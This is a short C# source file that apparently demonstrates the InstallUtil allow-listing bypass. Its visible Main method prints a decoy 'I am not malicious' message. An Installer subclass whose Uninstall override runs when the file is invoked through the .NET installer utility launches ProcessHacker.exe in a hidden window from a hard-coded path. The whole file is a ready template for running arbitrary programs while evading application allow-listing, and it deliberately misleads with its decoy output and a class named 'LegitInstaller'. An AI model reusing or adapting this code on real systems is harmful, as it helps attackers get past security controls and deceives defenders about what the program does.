using System;
using System.Net;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;


public class Program
{
    public static void Main()
    {
        Console.WriteLine("I am not malicious :)");
        Console.ReadKey();
    }

}

[System.ComponentModel.RunInstaller(true)]
public class Sample : System.Configuration.Install.Installer
{
    public override void Uninstall(System.Collections.IDictionary savedState)
    {
        LegitInstaller.Run();
    }

}

public class LegitInstaller
{

    public static void Run()
    {
        ProcessStartInfo _processStartInfo = new ProcessStartInfo();
		  _processStartInfo.WorkingDirectory = @"D:\processhacker\2.39\x64";
		  _processStartInfo.FileName         = @"ProcessHacker.exe";
		  _processStartInfo.CreateNoWindow   = true;
		
		Process.Start(_processStartInfo);
        Console.ReadKey();

    }

}